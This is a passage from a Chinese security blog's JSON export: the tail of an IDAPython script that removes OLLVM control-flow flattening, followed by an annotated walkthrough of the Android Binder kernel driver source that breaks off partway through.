((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 0), ((4203403, 4203428), 0), ((4203433, 4203457), 1), ((4203462, 4203490), 0), ((4203495, 4203514), 1), ((4203519, 4203558), 1), ((4203563, 4203585), 1), ((4203590, 4203609), 0), ((4203614, 4203636), 1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 1), ((4203403, 4203428), 1), ((4203656, 4203689), 1), ((4203694, 4203737), 1), ((4203742, 4203776), 1), ((4203781, 4203804), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 1), ((4203893, 4203918), 1), ((4204138, 4204171), 1)]tbs = [(4204176, 4204182), (4203066, 4203066), (4203071, 4203098), (4203103, 4203157), (4203162, 4203314), (4203319, 4203341), (4203346, 4203366), (4203371, 4203398), (4203403, 4203428), (4203433, 4203457), (4203462, 4203490), (4203495, 4203514), (4203519, 4203558), (4203563, 4203585), (4203590, 4203609), (4203614, 4203636), (4203641, 4203651), (4203656, 4203689), (4203694, 4203737), (4203742, 4203776), (4203781, 4203804), (4203809, 4203831), (4203836, 4203856), (4203861, 4203888), (4203893, 4203918), (4203923, 4203957), (4203962, 4203981), (4203986, 4204025), (4204030, 4204040), (4204045, 4204067), (4204072, 4204091), (4204096, 4204118), (4204123, 4204133), (4204138, 4204171)]fbs = [(4202133, 4202159), (4202165, 4202165), (4202170, 4202187), (4202193, 4202193), (4202198, 4202215), (4202221, 4202221), (4202226, 4202243), (4202249, 4202249), (4202254, 4202271), (4202277, 4202277), (4202282, 4202299), (4202305, 4202305), (4202310, 4202327), (4202333, 4202333), (4202338, 4202355), (4202361, 4202361), (4202366, 4202383), (4202389, 4202389), (4202394, 4202411), (4202417, 4202417), (4202422, 4202439), (4202445, 4202445), (4202450, 4202467), (4202473, 4202473), (4202478, 4202495), (4202501, 4202501), (4202506, 4202523), (4202529, 4202529), (4202534, 4202551), (4202557, 4202557), (4202562, 4202579), (4202585, 4202585), (4202590, 4202607), (4202613, 4202613), (4202618, 4202635), (4202641, 4202641), (4202646, 4202663), (4202669, 4202669), (4202674, 4202691), (4202697, 4202697), (4202702, 4202719), (4202725, 4202725), (4202730, 4202747), (4202753, 4202753), (4202758, 4202775), (4202781, 4202781), (4202786, 4202803), (4202809, 4202809), (4202814, 4202831), (4202837, 4202837), (4202842, 4202859), (4202865, 4202865), (4202870, 4202887), (4202893, 4202893), (4202898, 4202915), (4202921, 4202921), (4202926, 4202943), (4202949, 4202949), (4202954, 4202971), (4202977, 4202977), (4202982, 4202999), (4203005, 4203005), (4203010, 4203027), (4203033, 4203033), (4203038, 4203055), (4203061, 4203061), (4203066, 4203066), (4203071, 4203098), (4203103, 4203157), (4203162, 4203314), (4203319, 4203341), (4203346, 4203366), (4203371, 4203398), (4203403, 4203428), (4203433, 4203457), (4203462, 4203490), (4203495, 4203514), (4203519, 4203558), (4203563, 4203585), (4203590, 4203609), (4203614, 4203636), (4203641, 4203651), (4203656, 4203689), (4203694, 4203737), (4203742, 4203776), (4203781, 4203804), (4203809, 4203831), (4203836, 4203856), (4203861, 4203888), (4203893, 4203918), (4203923, 4203957), (4203962, 4203981), (4203986, 4204025), (4204030, 4204040), (4204045, 4204067), (4204072, 4204091), (4204096, 4204118), (4204123, 4204133), (4204138, 4204171), (4204183, 4204183)]block_info = &#123;&#125; #判断有没有 patch 结束for i in range(len(tbs)): block_info[tbs[i][0]] = &#123;'finish': 0,'ret':0&#125;#nop 掉所有虚假块for fb in fbs: patch_nop(fb[1], fb[1] + idc.get_item_size(fb[1]))for tb in tbs: dont_patch = False current_addr = tb[0] while current_addr &lt;= tb[1]: # print(hex(current_addr),idc.GetDisasm(current_addr)) if \"cmov\" in idc.print_insn_mnem(current_addr): #cmov 指令会影响分支跳转，所以这里直接 patch 掉 patch_nop_line(current_addr) dont_patch = True # print(hex(current_addr),hex(tb_path[i][0])) elif internal_reg in idc.print_operand(current_addr, 0): print('find internal_reg!') patch_nop_line(current_addr) elif 'ret' in idc.print_insn_mnem(current_addr): block_info[tb[0]]['ret'] = 1 dont_patch = True current_addr = idc.next_head(current_addr) if not dont_patch: patch_nop_line(tb[1]) block_info[tb[0]]['finish'] = 1# 序言块 -> 第一个真实块 patchjmp_patch(preamble_block, tb_path[0][0][0])for i in range(len(tb_path) - 1): # 不是返回块，也未完成 patch, 剩下的指令都是有分支跳转的. if block_info[tb_path[i][0][0]]['finish'] == 0 and not block_info[tb_path[i][0][0]]['ret']: ZF = tb_path[i][1] #当要跳转的块和当前块不连续时，这个分支跳转才修复完成 if not idc.next_head(tb_path[i][0][1]) == tb_path[i + 1][0][0]: block_info[tb_path[i][0][0]]['finish'] = 1 j_code = ('jnz', 'jz') jmp_patch(tb_path[i][0][1], tb_path[i + 1][0][0], j_code[ZF])patch 完之后看一下，这个代码也太好看了吧哈哈哈！ (●'◡'●) 小小总结一下，感觉 ollvm 的控制流平坦化去混淆原来那么简单呐～去年 sec2023 安卓赛题的 CESL-BR 混淆和 CEST-BR 混淆的反混淆 idapython 脚本可真是把我写昏过去了 (倒) # 参考资料 ollvm 快速学习 跟着铁头干混淆 3 ubuntu 下用 docker 编译 ollvm (保证成功) OLLVM 混淆学习（0）—— 环境搭建及混淆初体验 利用 angr 符号执行去除虚假控制流 [原创] Android APP 漏洞之战（14）——Ollvm 混淆与反混淆 利用符号执行去除控制流平坦化 代码混淆与反混淆学习 - 第一弹","categories":[],"tags":[{"name":"ollvm","slug":"ollvm","permalink":"https://oacia.dev/tags/ollvm/"}]},{"title":"android binder源码分析","slug":"android-binder","date":"2024-07-06T06:25:21.000Z","updated":"2025-04-08T18:55:11.439Z","comments":true,"path":"android-binder/","link":"","permalink":"https://oacia.dev/android-binder/","excerpt":"","text":"Binder 是 Android 独有的一种通信机制， Activity ， Service ， Broadcast ， ContentProvider 这四大组件所涉及的多进程间的通信底层都是依赖于 Binder IPC 机制。学好底层的通信原理对掌握安卓这幢大厦有着重要的意义. # 说明 本文所研究的安卓内核版本为 Linux version 4.9.270-g862f51bac900-ab7613625 安卓框架版本为 android-12.0.0_r34 # Binder 简介 从进程角度来看 IPC (Inter Process Communication) 机制，每个 Android 的进程，只能运行在自己进程所拥有的虚拟地址空间。对于用户空间，不同进程之间彼此是不能共享的，而内核空间却是可共享的。Client 进程向 Server 进程通信，恰恰是利用进程间可共享的内核内存空间来完成底层通信工作的，Client 端与 Server 端进程往往采用 ioctl 等方法跟内核空间的驱动进行交互。 Binder 通信采用 C/S 架构，从组件视角来说，包含 Client、Server、ServiceManager 以及 binder 驱动，其中 ServiceManager 用于管理系统中的各种服务。架构图如下所示，图中的 Client,Server,Service Manager 之间交互都是虚线表示，是由于它们彼此之间不是直接交互的，而是都通过 Binder 驱动进行交互的，从而实现 IPC 通信方式。其中 Binder 驱动位于内核空间，Client,Server,Service Manager 位于用户空间。 # Binder 设备的初始化过程 在 Linux 中，万物皆文件，那么毫无疑问，Binder 其实也是一个文件，它的初始化函数是 binder_init , 主要功能是注册 binder 设备 //kernel\\drivers\\android\\binder.cstatic int __init binder_init(void)&#123; int ret; char *device_name, *device_names, *device_tmp; struct binder_device *device; struct hlist_node *tmp; // 初始化 lru 链表，该链表用于管理内存页；注册 shrinker 结构体 ret = binder_alloc_shrinker_init(); if (ret) return ret; // 原子操作赋值 atomic_set(&amp;binder_transaction_log.cur, ~0U); atomic_set(&amp;binder_transaction_log_failed.cur, ~0U); /**debug 相关的代码，之后 debug 相关的代码将不再出现 **/ // 在 debugfs 文件系统创建了 binder 文件夹 binder_debugfs_dir_entry_root = debugfs_create_dir(\"binder\", NULL); // 如果 binder 文件夹创建成功，则在该文件夹内继续创建 binder/proc 文件夹 if (binder_debugfs_dir_entry_root) binder_debugfs_dir_entry_proc = debugfs_create_dir(\"proc\", binder_debugfs_dir_entry_root); if (binder_debugfs_dir_entry_root) &#123; // 继续在 binder 目录中创建 state,stats,transactions,transaction_log,failed_transaction_log 文件，读取 Binder 驱动程序的运行情况 debugfs_create_file(\"state\", 0444, binder_debugfs_dir_entry_root, NULL, &amp;binder_state_fops); debugfs_create_file(\"stats\", 0444, binder_debugfs_dir_entry_root, NULL, &amp;binder_stats_fops); debugfs_create_file(\"transactions\", 0444, binder_debugfs_dir_entry_root, NULL, &amp;binder_transactions_fops); debugfs_create_file(\"transaction_log\", 0444, binder_debugfs_dir_entry_root, &amp;binder_transaction_log, &amp;binder_transaction_log_fops); debugfs_create_file(\"failed_transaction_log\", 0444, binder_debugfs_dir_entry_root, &amp;binder_transaction_log_failed, &amp;binder_transaction_log_fops); &#125; /* * Copy the module_parameter string, because we don't want to * tokenize it in-place. */ // 在内核空间中分配内存，GFP_KERNEL 表示正常分配内存 device_names = kzalloc(strlen(binder_devices_param) + 1, GFP_KERNEL); if (!device_names) &#123; ret = -ENOMEM; goto err_alloc_device_names_failed; &#125; // 将 binder,hwbinder,vndbinder 赋值给 device_names strcpy(device_names, binder_devices_param); device_tmp = device_names; while ((device_name = strsep(&amp;device_tmp, \",\"))) &#123; // 以 \",\" 作为分隔符，注册 misc 设备 /dev/binder/dev/hwbinder/dev/vndbinder ret = init_binder_device(device_name); if (ret) goto err_init_binder_device_failed; &#125; return ret;err_init_binder_device_failed: hlist_for_each_entry_safe(device, tmp, &amp;binder_devices, hlist) &#123; misc_deregister(&amp;device->miscdev); hlist_del(&amp;device->hlist); kfree(device); &#125; kfree(device_names);err_alloc_device_names_failed: debugfs_remove_recursive(binder_debugfs_dir_entry_root); return ret;&#125;在 binder_init 中，调用了 init_binder_device 通过 misc_register 来注册 binder 设备 //kernel\\drivers\\android\\binder.cstatic const struct file_operations binder_fops = &#123; .owner = THIS_MODULE, .poll = binder_poll, .unlocked_ioctl = binder_ioctl, .compat_ioctl = binder_ioctl,//IO 控制函数 .mmap = binder_mmap,// 内存映射函数 .open = binder_open,//binder 文件打开函数 .flush = binder_flush, .release = binder_release,&#125;;static int __init init_binder_device(const char *name)&#123; int ret; struct binder_device *binder_device; binder_device = kzalloc(sizeof(*binder_device), GFP_KERNEL); if (!binder_device) return -ENOMEM; binder_device->miscdev.fops = &amp;binder_fops;//// 设备的文件操作结构，这是 file_operations 结构 binder_device->miscdev.minor = MISC_DYNAMIC_MINOR;// 次设备号 动态分配 binder_device->miscdev.name = name;//// 设备名 // 设置 binder_context，用于记录 servicemanager 的 binder_node 信息， // 由于 binder_device 是全局唯一的，这是 servicemanager 可以成为守护进 // 程的关键。 binder_device->context.binder_context_mgr_uid = INVALID_UID; binder_device->context.name = name; mutex_init(&amp;binder_device->context.context_mgr_node_lock); // 注册 binder 设备 ret = misc_register(&amp;binder_device->miscdev); if (ret &lt; 0) &#123; kfree(binder_device); return ret; &#125; hlist_add_head(&amp;binder_device->hlist, &amp;binder_devices); return ret;&#125;# Binder 设备文件的打开过程 一个进程在使用 binder 进行通信之前，需要使用 open 函数来打开设备文件 /dev/binder, 在这个过程中， binder_open 函数就会被调用，这个函数的作用如下 创建 binder_proc 对象 把当前进程等信息保存到 binder_proc 对象 把 binder_proc 对象保存到文件指针 filp 把 binder_proc 加入到全局链表 binder_procs 。 //kernel\\drivers\\android\\binder.cstatic int binder_open(struct inode *nodp, struct file *filp)&#123; struct binder_proc *proc; struct binder_device *binder_dev; binder_debug(BINDER_DEBUG_OPEN_CLOSE, \"%s: %d:%d\\n\", __func__, current->group_leader->pid, current->pid); // 创建 binder_proc 结构体遍历 proc，并为 proc 实现初始化 proc = kzalloc(sizeof(*proc), GFP_KERNEL); if (proc == NULL) return -ENOMEM; spin_lock_init(&amp;proc->inner_lock); spin_lock_init(&amp;proc->outer_lock); atomic_set(&amp;proc->tmp_ref, 0); get_task_struct(current->group_leader); /* 任何一个进程，如果只有主线程，那 pid 是自己，tgid 是自己，group_leader 指向的还是自己。 但是，如果一个进程创建了其他线程，那就会有所变化了。线程有自己的 pid，tgid 就是进程的 主线程的 pid，group_leader 指向的就是进程的主线程。 有了 tgid 之后，我们就可以判断一个 task 是线程还是进程了。 pid : 每个 task 都有一个 pid，是唯一的，不管是进程还是线程。 tgid: 指向主线程的 pid */ //group_leader: 指向进程的主线程 proc->tsk = current->group_leader; mutex_init(&amp;proc->files_lock); // 初始化 todo 队列 INIT_LIST_HEAD(&amp;proc->todo); // 初始化进程优先级 if (binder_supported_policy(current->policy)) &#123; proc->default_priority.sched_policy = current->policy; proc->default_priority.prio = current->normal_prio; &#125; else &#123; proc->default_priority.sched_policy = SCHED_NORMAL; proc->default_priority.prio = NICE_TO_PRIO(0); &#125; // 初始化 binder_dev,proc->context,proc->alloc binder_dev = container_of(filp->private_data, struct binder_device, miscdev); proc->context = &amp;binder_dev->context; binder_alloc_init(&amp;proc->alloc); //binder_alloc 初始化 binder_stats_created(BINDER_STAT_PROC); proc->pid = current->group_leader->pid; INIT_LIST_HEAD(&amp;proc->delivered_death); INIT_LIST_HEAD(&amp;proc->waiting_threads); // 将初始化完成的 binder_proc 结构体 proc 保存到 filp->private_data 中 //filp 指向一个打开的文件结构体，它和进程调用 open 函数打开设备文件 ///dev/binder 之后内核返回给进程的文件描述符是相互关联的 filp->private_data = proc; mutex_lock(&amp;binder_procs_lock); // 将 binder_proc 结构体 proc 加入到一个全局哈希队列 binder_procs 中 //binder 通过遍历这个哈希队列就可以知道有多少进程在使用 binder hlist_add_head(&amp;proc->proc_node, &amp;binder_procs); mutex_unlock(&amp;binder_procs_lock); return 0;&#125;# Binder 设备文件的内存映射过程 在打开了设备文件 /dev/binder 之后，还需要调用 mmap 函数来把这个设备文件映射到进程的地址空间，此时 binder 驱动程序中的 binder_mmap 函数就会被调用，主要功能：在内核虚拟地址空间，申请一块与用户虚拟内存相同大小的内存；然后再申请 1 个 page 大小的物理内存，再将同一块物理内存分别映射到内核虚拟地址空间和用户虚拟内存空间，从而实现了用户空间的 Buffer 和内核空间的 Buffer 同步操作的功能。 //kernel\\drivers\\android\\binder.cstatic int binder_mmap(struct file *filp, struct vm_area_struct *vma)&#123; int ret; struct binder_proc *proc = filp->private_data; const char *failure_string; // 保证请求分配内存的线程为主线程 if (proc->tsk != current->group_leader) return -EINVAL; // 保证映射内存 &lt;= 4MB, 说明 Binder 最多能为进程分配 4MB 的内核缓冲区来传输数据 if ((vma->vm_end - vma->vm_start) > SZ_4M) vma->vm_end = vma->vm_start + SZ_4M; binder_debug(BINDER_DEBUG_OPEN_CLOSE, \"%s: %d %lx-%lx (%ld K) vma %lx pagep %lx\\n\", __func__, proc->pid, vma->vm_start, vma->vm_end, (vma->vm_end - vma->vm_start) / SZ_1K, vma->vm_flags, (unsigned long)pgprot_val(vma->vm_page_prot)); //#define FORBIDDEN_MMAP_FLAGS (VM_WRITE) // 检查进程要映射的地址空间是否可写 if (vma->vm_flags &amp; FORBIDDEN_MMAP_FLAGS) &#123; ret = -EPERM; failure_string = \"bad vm_flags\"; goto err_bad_arg; &#125; //VM_DONTCOPY /* Do not copy this vma on fork */ //VM_MIXEDMAP /* Can contain \"struct page\" and pure PFN pages */ // 禁止拷贝 vma->vm_flags |= VM_DONTCOPY | VM_MIXEDMAP; // 为该内存赋予 r-x 权限 vma->vm_flags &amp;= ~VM_MAYWRITE; vma->vm_ops = &amp;binder_vm_ops; vma->vm_private_data = proc; // 为进程分配内核缓冲区，并将这块物理内存分别映射到内核虚拟地址空间和用户虚拟内存空间 ret = binder_alloc_mmap_handler(&amp;proc->alloc, vma); if (ret) return ret; mutex_lock(&amp;proc->files_lock); proc->files = get_files_struct(current); mutex_unlock(&amp;proc->files_lock); return 0;err_bad_arg: pr_err(\"%s: %d %lx-%lx %s failed %d\\n\", __func__, proc->pid, vma->vm_start, vma->vm_end, failure_string, ret); return ret;&#125;Binder 驱动程序为进程分配的内核缓冲区即为一系列物理页面，他们分别被映射到进程的用户地址空间和内核地址空间。当 Binder 驱动程序需要将一块数据传输给一个进程时，它可以先把这块数据保存在为该进程分配所分配的一块内核缓冲区中，然后再把这块内核缓冲区的用户空间地址告诉进程，最后进程就可以访问到里面的数据了。这样做的好处是不需要将内核空间拷贝到用户空间，从而提高了数据传输的效率. # binder 设备文件的 ioctl binder_ioctl 函数负责在两个进程间收发 IPC 数据和 IPC reply 数据。 ioctl (input/output control) 是一个专用于设备输入输出操作的系统调用，该调用传入一个跟设备有关的请求码，系统调用的功能完全取决于请求码。 ioctl 命令 数据类型 操作 使用场景 BINDER_WRITE_READ struct binder_write_read 收发 Binder IPC 数据 Binder 读写交互场景，IPC.talkWithDriver BINDER_SET_IDLE_TIMEOUT __s64 BINDER_SET_MAX_THREADS __u32 设置 Binder 线程最大个数 初始化 ProcessState 对象，open_driver () ; 主动调整参数，ProcessState.setThreadPoolMaxThreadCount () BINDER_SET_IDLE_PRIORITY __s32 BINDER_SET_CONTEXT_MGR __s32 设置 Service Manager 节点 servicemanager 进程成为上下文管理者，binder_become_context_manager () BINDER_THREAD_EXIT __s32 释放 Binder 线程 BINDER_VERSION struct binder_version 获取 Binder 版本信息 初始化 ProcessState 对象，open_driver () BINDER_GET_NODE_DEBUG_INFO struct binder_node_debug_info BINDER_GET_NODE_INFO_FOR_REF struct binder_node_info_for_ref BINDER_SET_CONTEXT_MGR_EXT struct flat_binder_object //kernel\\drivers\\android\\binder.cstatic long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)&#123; int ret; struct binder_proc *proc = filp->private_data; struct binder_thread *thread; unsigned int size = _IOC_SIZE(cmd); void __user *ubuf = (void __user *)arg; /*pr_info(\"binder_ioctl: %d:%d %x %lx\\n\", proc->pid, current->pid, cmd, arg);*/ binder_selftest_alloc(&amp;proc->alloc); trace_binder_ioctl(cmd, arg); ret = wait_event_interruptible(binder_user_error_wait, binder_stop_on_user_error &lt; 2); if (ret) goto err_unlocked; thread = binder_get_thread(proc); if (thread == NULL) &#123; ret = -ENOMEM; goto err; &#125; switch (cmd) &#123; // 进行 binder 的读写操作，这个命令使用的最为频繁 case BINDER_WRITE_READ: ret = binder_ioctl_write_read(filp, cmd, arg, thread); if (ret) goto err; break; // 设置 binder 最大支持的线程数 case BINDER_SET_MAX_THREADS: &#123; int max_threads; if (copy_from_user(&amp;max_threads, ubuf, sizeof(max_threads))) &#123; ret = -EINVAL; goto err; &#125; binder_inner_proc_lock(proc); proc->max_threads = max_threads; binder_inner_proc_unlock(proc); break; &#125; case BINDER_SET_CONTEXT_MGR_EXT: &#123; struct flat_binder_object fbo; if (copy_from_user(&amp;fbo, ubuf, sizeof(fbo))) &#123; ret = -EINVAL; goto err; &#125; ret = binder_ioctl_set_ctx_mgr(filp, &amp;fbo); if (ret) goto err; break; &#125; // 成为 binder 的上下文管理者，也就是 ServiceManager 成为守护进程 case BINDER_SET_CONTEXT_MGR: ret = binder_ioctl_set_ctx_mgr(filp, NULL); if (ret) goto err; break; // 当 binder 线程退出，释放 binder 线程 case BINDER_THREAD_EXIT: binder_debug(BINDER_DEBUG_THREADS, \"%d:%d exit\\n\", proc->pid, thread->pid); binder_thread_release(proc, thread); thread = NULL; break; // 获取 binder 的版本号 case BINDER_VERSION: &#123; struct binder_version __user *ver = ubuf; if (size != sizeof(struct binder_version)) &#123; ret = -EINVAL; goto err; &#125; if (put_user(BINDER_CURRENT_PROTOCOL_VERSION, &amp;ver->protocol_version)) &#123; ret = -EINVAL; goto err; &#125; break; &#125; case BINDER_GET_NODE_INFO_FOR_REF: &#123; struct binder_node_info_for_ref info; if (copy_from_user(&amp;info, ubuf, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; ret = binder_ioctl_get_node_info_for_ref(proc, &amp;info); if (ret &lt; 0) goto err; if (copy_to_user(ubuf, &amp;info, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; break; &#125; case BINDER_GET_NODE_DEBUG_INFO: &#123; struct binder_node_debug_info info; if (copy_from_user(&amp;info, ubuf, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; ret = binder_ioctl_get_node_debug_info(proc, &amp;info); if (ret &lt; 0) goto err; if (copy_to_user(ubuf, &amp;info, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; break; &#125; default: ret = -EINVAL; goto err; &#125; ret = 0;err: if (thread) thread->looper_need_return = false; wait_event_interruptible(binder_user_error_wait, binder_stop_on_user_error &lt; 2); if (ret &amp;&amp; ret != -ERESTARTSYS) pr_info(\"%d:%d ioctl %x %lx returned %d\\n\", proc->pid, current->pid, cmd, arg, ret);err_unlocked: trace_binder_ioctl_done(ret); return ret;&#125;# Binder 内部通信协议 Client 进程通过 RPC (Remote Procedure Call Protocol) 与 Server 通信，可以简单地划分为三层，应用层、IPC 层、内核驱动层。 demo() 是 Client 端和 Server 共同协商好的统一方法；handle、RPC 数据、代码、协议这 4 项组成了 IPC 层的数据，通过 IPC 层进行数据传输；而真正在 Client 和 Server 两端建立通信的基础设施便是 Binder Driver。 # 通信模型 一次完整的 Binder 通信过程如下 Binder 协议包含在 IPC 数据中，分为两类: BINDER_COMMAND_PROTOCOL ：binder 请求码，以”BC_“开头，简称 BC 码，用于从 IPC 层传递到 Binder Driver 层； BINDER_RETURN_PROTOCOL ：binder 响应码，以”BR_“开头，简称 BR 码，用于从 Binder 